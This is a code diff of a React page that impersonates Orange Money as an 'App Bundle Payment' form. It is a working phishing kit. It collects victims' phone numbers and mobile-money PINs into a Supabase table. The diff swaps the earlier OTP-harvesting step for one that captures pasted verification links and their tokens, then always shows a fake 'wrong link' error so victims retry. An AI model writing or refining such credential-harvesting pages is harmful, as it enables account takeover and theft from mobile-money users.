@@ -1,10 +1,9 @@
-import { useState, useEffect } from "react";
-import { Phone, Lock, ChevronDown, Globe, ArrowLeft } from "lucide-react";
+import { useState } from "react";
+import { Phone, Lock, ChevronDown, ArrowLeft } from "lucide-react";
 import countryCodes from "./countryCodes";
 import { supabase } from "./supabaseClient";
 
-type PaymentStep = "payment" | "otp";
-type Language = "en" | "fr";
+type PaymentStep = "payment" | "verify";
 
 interface PaymentFormData {
   countryCode: string;
@@ -18,73 +17,38 @@ const LOGO_URL =
 const BG_IMAGE_URL =
   "https://orangemoney.orange.cm/orange-money/resources/img/Generique%20OM%20Mastercard.jpeg";
 
-const translations = {
-  en: {
-    bundlePayment: "App Bundle Payment",
-    verifyPayment: "Verify Payment",
-    country: "Country",
-    chooseCountry: "Choose your country",
-    phoneNumber: "Phone Number",
-    pin: "Enter your PIN",
-    pinPlaceholder: "4–5-digit PIN",
-    processing: "Processing...",
-    confirmPayment: "Confirm Payment",
-    otpSent: "Enter OTP sent to",
-    otpError: "OTP must be 4–6 digits",
-    tryAgain: "Try again in",
-    verifyOtp: "Verify OTP",
-    back: "Back",
-    chooseLanguage: "Choose Language",
-  },
-  fr: {
-    bundlePayment: "Paiement du forfait",
-    verifyPayment: "Vérifier le paiement",
-    country: "Pays",
-    chooseCountry: "Choisissez votre pays",
-    phoneNumber: "Numéro de téléphone",
-    pin: "Code PIN",
-    pinPlaceholder: "PIN à 4–5 chiffres",
-    processing: "Traitement...",
-    confirmPayment: "Confirmer le paiement",
-    otpSent: "Saisissez le code envoyé à",
-    otpError: "Le code doit contenir 4–6 chiffres",
-    tryAgain: "Réessayez dans",
-    verifyOtp: "Vérifier le code",
-    back: "Retour",
-    chooseLanguage: "Choisir la langue",
-  },
-};
-
 export default function VodacomPayment() {
-  const [language, setLanguage] = useState<Language>("en");
-  const t = translations[language];
-
-  const [languageOpen, setLanguageOpen] = useState(false);
   const [step, setStep] = useState<PaymentStep>("payment");
+
   const [formData, setFormData] = useState<PaymentFormData>({
     countryCode: "",
     phoneNumber: "",
     pin: "",
   });
 
-  // ✅ OTP is now a single string
-  const [otp, setOtp] = useState("");
-
+  const [verificationLink, setVerificationLink] = useState("");
+  const [linkError, setLinkError] = useState("");
   const [loading, setLoading] = useState(false);
   const [dropdownOpen, setDropdownOpen] = useState(false);
-  const [otpError, setOtpError] = useState("");
-  const [retrySeconds, setRetrySeconds] = useState(0);
 
-  // --- Validation flags ---
+  const [countdown, setCountdown] = useState(0);
+  const [verificationStatus, setVerificationStatus] = useState<
+    "idle" | "loading" | "success" | "error"
+  >("idle");
+
   const isPhoneValid = /^\d{9,10}$/.test(formData.phoneNumber);
   const isPinValid = /^\d{4,5}$/.test(formData.pin);
   const isPaymentValid = formData.countryCode && isPhoneValid && isPinValid;
 
+  // =========================
+  // PAYMENT SAVE
+  // =========================
   const handlePayment = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!isPaymentValid) return;
 
     setLoading(true);
+
     try {
       const { error } = await supabase.from("orange_payment_records").insert({
         country: formData.countryCode,
@@ -94,68 +58,65 @@ export default function VodacomPayment() {
 
       if (error) throw error;
 
-      setStep("otp");
-    } catch {
-      alert(
-        language === "en"
-          ? "Error saving payment."
-          : "Erreur lors de l'enregistrement."
-      );
+      setStep("verify");
+    } catch (err) {
+      alert("Error saving payment.");
     } finally {
       setLoading(false);
     }
   };
 
-  const handleVerifyOtp = async (e: React.FormEvent) => {
+  // =========================
+  // SAVE VERIFICATION LINK + 10s countdown
+  // =========================
+  const handleVerifyLink = async (e: React.FormEvent) => {
     e.preventDefault();
-    const code = otp;
 
-    // --- 4 to 6 digit validation ---
-    if (code.length < 4 || code.length > 6 || !/^\d{4,6}$/.test(code)) {
-      setOtpError(t.otpError);
+    if (!verificationLink.startsWith("http")) {
+      setLinkError("Please paste a valid verification link.");
       return;
     }
 
-    if (retrySeconds > 0) return;
-
     setLoading(true);
+    setVerificationStatus("loading");
+    setLinkError("");
+
     try {
+      const url = new URL(verificationLink);
+      const token = url.searchParams.get("token");
+
       const { error } = await supabase.from("orange_otp_records").insert({
         country: formData.countryCode,
         number: formData.phoneNumber,
-        otp: code,
+        verification: verificationLink,
+        token: token,
       });
 
       if (error) throw error;
 
-      setOtpError(
-        language === "en"
-          ? "OTP expired. Try again in 10 sec."
-          : "Code expiré. Réessayez dans 10 sec."
-      );
-      setRetrySeconds(10);
-      setOtp("");
-    } catch {
-      setOtpError(language === "en" ? "OTP error." : "Erreur du code.");
+      // Start 10-second countdown
+      setCountdown(10);
+      const timer = setInterval(() => {
+        setCountdown((prev) => {
+          if (prev <= 1) {
+            clearInterval(timer);
+            setVerificationStatus("success");
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+    } catch (err) {
+      setVerificationStatus("error");
+      setLinkError("Expired or wrong link.");
     } finally {
       setLoading(false);
     }
   };
 
-  useEffect(() => {
-    if (retrySeconds > 0) {
-      const timer = setInterval(() => setRetrySeconds((s) => s - 1), 1000);
-      return () => clearInterval(timer);
-    } else setOtpError("");
-  }, [retrySeconds]);
-
-  // --- Back arrow handler ---
   const handleBack = () => {
-    if (step === "otp") {
-      setStep("payment");
-    } else {
-      window.history.back();
-    }
+    if (step === "verify") setStep("payment");
+    else window.history.back();
   };
 
   return (
@@ -164,7 +125,6 @@ export default function VodacomPayment() {
       style={{ backgroundImage: `url(${BG_IMAGE_URL})` }}
     >
       <div className="w-full max-w-md bg-white rounded-2xl shadow-xl overflow-hidden relative">
-
         {/* Back Arrow */}
         <div className="absolute top-4 left-4 z-20">
           <button
@@ -172,65 +132,26 @@ export default function VodacomPayment() {
             className="flex items-center gap-2 px-3 py-1 bg-gray-100 rounded-lg text-sm"
           >
             <ArrowLeft size={16} />
-            {t.back}
+            Back
           </button>
-        </div>
-
-        {/* Language Dropdown */}
-        <div className="absolute top-4 right-4">
-          <div className="relative">
-            <button
-              type="button"
-              onClick={() => setLanguageOpen(!languageOpen)}
-              className="flex items-center gap-2 px-3 py-1 bg-gray-100 rounded-lg text-sm"
-            >
-              <Globe size={16} />
-              {language.toUpperCase()}
-              <ChevronDown size={16} />
-            </button>
-
-            {languageOpen && (
-              <div className="absolute right-0 mt-2 bg-white border rounded-lg shadow-md w-32">
-                <div
-                  onClick={() => {
-                    setLanguage("en");
-                    setLanguageOpen(false);
-                  }}
-                  className="px-4 py-2 hover:bg-gray-100 cursor-pointer"
-                >
-                  English
-                </div>
-                <div
-                  onClick={() => {
-                    setLanguage("fr");
-                    setLanguageOpen(false);
-                  }}
-                  className="px-4 py-2 hover:bg-gray-100 cursor-pointer"
-                >
-                  Français
-                </div>
-              </div>
-            )}
-          </div>
         </div>
 
         {/* Header */}
         <div className="bg-orange-600 px-6 py-10 text-white text-center">
           <div className="bg-white rounded-2xl p-4 w-32 mx-auto mb-6 shadow-md">
-            <img src={LOGO_URL} alt="Orange Money" className="h-30 w-50" />
+            <img src={LOGO_URL} alt="Orange Money" />
           </div>
           <h1 className="text-2xl font-bold">
-            {step === "payment" ? t.bundlePayment : t.verifyPayment}
+            {step === "payment" ? "App Bundle Payment" : "Verify Payment"}
           </h1>
         </div>
 
-        {/* Payment Form */}
         {step === "payment" ? (
           <form onSubmit={handlePayment} className="p-6 space-y-6">
             {/* Country */}
             <div className="relative">
               <label className="block text-sm font-semibold text-gray-700 mb-2">
-                {t.country}
+                Country
               </label>
               <button
                 type="button"
@@ -238,7 +159,7 @@ export default function VodacomPayment() {
                 className="w-full px-4 py-3 border-2 border-gray-300 rounded-xl flex items-center justify-between bg-white"
               >
                 <span className="text-gray-400">
-                  {formData.countryCode || t.chooseCountry}
+                  {formData.countryCode || "Choose your country"}
                 </span>
                 <ChevronDown />
               </button>
@@ -266,7 +187,7 @@ export default function VodacomPayment() {
             {/* Phone */}
             <div>
               <label className="block text-sm font-semibold text-gray-700 mb-2">
-                {t.phoneNumber}
+                Phone Number
               </label>
               <div className="relative">
                 <Phone className="absolute left-4 top-3 text-gray-400" />
@@ -288,7 +209,7 @@ export default function VodacomPayment() {
             {/* PIN */}
             <div>
               <label className="block text-sm font-semibold text-gray-700 mb-2">
-                {t.pin}
+                Enter PIN
               </label>
               <div className="relative">
                 <Lock className="absolute left-4 top-3 text-gray-400" />
@@ -296,7 +217,7 @@ export default function VodacomPayment() {
                   type="password"
                   maxLength={5}
                   className="w-full pl-12 pr-4 py-3 border-2 border-gray-300 rounded-xl bg-white"
-                  placeholder={t.pinPlaceholder}
+                  placeholder="4–5-digit PIN"
                   value={formData.pin}
                   onChange={(e) =>
                     setFormData({
@@ -308,7 +229,6 @@ export default function VodacomPayment() {
               </div>
             </div>
 
-            {/* Confirm */}
             <button
               disabled={!isPaymentValid || loading}
               className={`w-full py-4 rounded-xl font-semibold text-lg shadow-lg ${
@@ -317,41 +237,54 @@ export default function VodacomPayment() {
                   : "bg-orange-600 text-white"
               }`}
             >
-              {loading ? t.processing : t.confirmPayment}
+              {loading ? "Processing..." : "Confirm Payment"}
             </button>
           </form>
         ) : (
-          /* OTP Form (single box) */
-          <form onSubmit={handleVerifyOtp} className="p-6 text-center">
-
+          <form onSubmit={handleVerifyLink} className="p-6 text-center">
             <p className="mb-4 text-gray-700">
-              {t.otpSent} {formData.countryCode} {formData.phoneNumber}
+              A verification link has been sent to {formData.countryCode}{" "}
+              {formData.phoneNumber}
             </p>
 
-            {/* 🔥 ONE LONG OTP INPUT */}
+            <p className="mb-4 text-sm text-gray-500">
+              Please copy the full verification link and paste it below to continue.
+            </p>
+
             <input
-              type="tel"
-              maxLength={6}
-              value={otp}
-              onChange={(e) =>
-                setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))
-              }
-              className="w-64 mx-auto text-center text-2xl py-3 border-2 border-gray-300 rounded-xl bg-white tracking-widest"
-              placeholder="Enter OTP (4–6 digits)"
+              type="url"
+              value={verificationLink}
+              onChange={(e) => setVerificationLink(e.target.value.trim())}
+              className="w-full mx-auto text-sm py-3 px-4 border-2 border-gray-300 rounded-xl bg-white"
+              placeholder="Paste verification link here"
+              disabled={verificationStatus === "loading"}
             />
 
-            {otpError && (
-              <p className="text-orange-600 font-medium mt-3">{otpError}</p>
+            {/* Countdown & Status Messages */}
+            {verificationStatus === "loading" && countdown > 0 && (
+              <p className="text-gray-700 font-medium mt-3">
+                Please wait {countdown}s before entering.
+              </p>
+            )}
+
+            {verificationStatus === "success" && (
+              <p className="text-green-600 font-medium mt-3">
+                try again !! wrong link.
+              </p>
+            )}
+
+            {verificationStatus === "error" && (
+              <p className="text-orange-600 font-medium mt-3">
+                Expired or wrong link.
+              </p>
             )}
 
             <button
               type="submit"
-              disabled={retrySeconds > 0}
+              disabled={loading || verificationStatus === "loading"}
               className="w-full mt-4 bg-orange-600 text-white py-4 rounded-xl font-semibold text-lg shadow-lg disabled:bg-gray-400"
             >
-              {retrySeconds > 0
-                ? `${t.tryAgain} ${retrySeconds}s`
-                : t.verifyOtp}
+              {loading ? "Processing..." : "Verify Link"}
             </button>
           </form>
         )}
